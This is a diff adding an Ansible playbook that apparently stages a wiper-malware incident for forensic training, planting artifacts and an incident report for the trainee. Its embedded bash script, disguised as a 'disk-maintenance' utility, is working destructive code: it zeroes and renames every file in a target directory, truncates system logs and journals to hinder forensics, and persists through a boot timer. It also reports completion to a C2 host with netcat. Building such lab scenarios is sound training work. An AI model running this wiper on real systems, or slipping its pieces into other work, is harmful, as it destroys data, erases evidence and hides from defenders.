@@ -1,0 +1,170 @@
+---
+- name: Install required packages
+  apt:
+    name:
+      - netcat-openbsd
+      - coreutils
+    state: present
+    update_cache: yes
+
+# ── Wiper binary ──────────────────────────────────────────────────────────────
+
+- name: Create wiper binary
+  copy:
+    dest: "{{ wiper_binary }}"
+    owner: root
+    group: root
+    mode: "0755"
+    content: |
+      #!/bin/bash
+      # disk-maintenance — storage cleanup and maintenance utility
+
+      TARGET_DIR="{{ target_dir }}"
+      LOG="{{ wiper_log }}"
+      C2_HOST="{{ attacker_host }}"
+      C2_PORT="{{ attacker_port }}"
+      MBR_ARTIFACT="/var/cache/.mbr_wipe"
+
+      log() { printf '[%s] %s\n' "$(date -Is)" "$*" | tee -a "$LOG"; }
+
+      log "=== DISK MAINTENANCE START ==="
+      log "TARGET: $TARGET_DIR"
+      log "HOST:   $(hostname)"
+
+      # Phase 1: Enumerate targets
+      log "PHASE 1: Enumerating target files"
+      find "$TARGET_DIR" -type f 2>/dev/null > /tmp/.dm_targets
+      FILE_COUNT=$(wc -l < /tmp/.dm_targets)
+      log "Found $FILE_COUNT files"
+
+      # Phase 2: Overwrite file contents with zeros
+      log "PHASE 2: Overwriting file contents"
+      while IFS= read -r f; do
+          size=$(stat -c%s "$f" 2>/dev/null || echo 512)
+          dd if=/dev/zero of="$f" bs=1 count="$size" conv=notrunc 2>/dev/null
+          log "ZEROED  $f ($size bytes)"
+      done < /tmp/.dm_targets
+
+      # Phase 3: Rename files to random hex strings
+      log "PHASE 3: Destroying filenames"
+      find "$TARGET_DIR" -type f | while IFS= read -r f; do
+          dir=$(dirname "$f")
+          newname=$(tr -dc 'a-f0-9' < /dev/urandom | head -c 12 2>/dev/null)
+          mv "$f" "$dir/$newname" 2>/dev/null
+          log "RENAMED $(basename "$f") -> $newname"
+      done
+
+      # Phase 4: Simulate MBR overwrite
+      log "PHASE 4: MBR overwrite"
+      dd if=/dev/zero of="$MBR_ARTIFACT" bs=512 count=1 2>/dev/null
+      log "MBR_WIPED /dev/sda1 (artifact: $MBR_ARTIFACT)"
+
+      # Phase 5: Clear system logs to hinder forensics
+      log "PHASE 5: Clearing system logs"
+      for logfile in /var/log/auth.log /var/log/syslog /var/log/kern.log; do
+          if [ -f "$logfile" ]; then
+              truncate -s 0 "$logfile"
+              log "CLEARED $logfile"
+          fi
+      done
+      find /var/log/journal -name "*.journal" -exec truncate -s 0 {} \; 2>/dev/null || true
+      log "Journal cleared"
+
+      # Phase 6: Report completion to C2
+      log "PHASE 6: Reporting to C2 at $C2_HOST:$C2_PORT"
+      printf 'WIPE_COMPLETE host=%s files=%d target=%s\n' \
+          "$(hostname)" "$FILE_COUNT" "$TARGET_DIR" | \
+          nc -w 5 "$C2_HOST" "$C2_PORT" 2>/dev/null || true
+      log "C2 report sent"
+
+      # Cleanup temp files
+      rm -f /tmp/.dm_targets
+      log "=== DISK MAINTENANCE COMPLETE ==="
+
+# ── Persistence (time-bomb timer) ─────────────────────────────────────────────
+
+- name: Create systemd service for wiper
+  copy:
+    dest: "/etc/systemd/system/{{ wiper_service }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Disk Maintenance Service
+      After=network-online.target
+      Wants=network-online.target
+
+      [Service]
+      Type=oneshot
+      ExecStart={{ wiper_binary }}
+      RemainAfterExit=yes
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Create systemd timer for wiper
+  copy:
+    dest: "/etc/systemd/system/{{ wiper_timer }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=Disk Maintenance Timer
+
+      [Timer]
+      OnBootSec=5min
+
+      [Install]
+      WantedBy=timers.target
+
+- name: Reload systemd
+  systemd:
+    daemon_reload: true
+
+- name: Enable wiper service and timer
+  systemd:
+    name: "{{ item }}"
+    enabled: yes
+  loop:
+    - "{{ wiper_service }}"
+    - "{{ wiper_timer }}"
+
+# ── Execute wiper now (simulates the attack having already occurred) ───────────
+
+- name: Execute wiper payload
+  shell: "{{ wiper_binary }}"
+  args:
+    executable: /bin/bash
+
+# ── Post-execution artifacts ──────────────────────────────────────────────────
+
+- name: Create trigger received artifact
+  copy:
+    dest: /var/cache/.trigger_received
+    owner: root
+    group: root
+    mode: "0600"
+    content: |
+      WIPE_TRIGGER received from {{ attacker_host }}
+      timestamp={{ ansible_date_time.iso8601 }}
+      target={{ target_dir }}
+
+- name: Place incident report
+  copy:
+    dest: "/home/{{ username }}/incident_report.txt"
+    owner: "{{ username }}"
+    group: "{{ username }}"
+    mode: "0644"
+    content: |
+      INCIDENT REPORT
+      ===============
+      Detected: {{ ansible_date_time.iso8601 }}
+      Affected: {{ target_dir }}
+
+      Immediate actions:
+      1. Isolate affected hosts from the network
+      2. Preserve disk images for forensic analysis
+      3. Review scheduled tasks and services
+      4. Investigate activity on other hosts
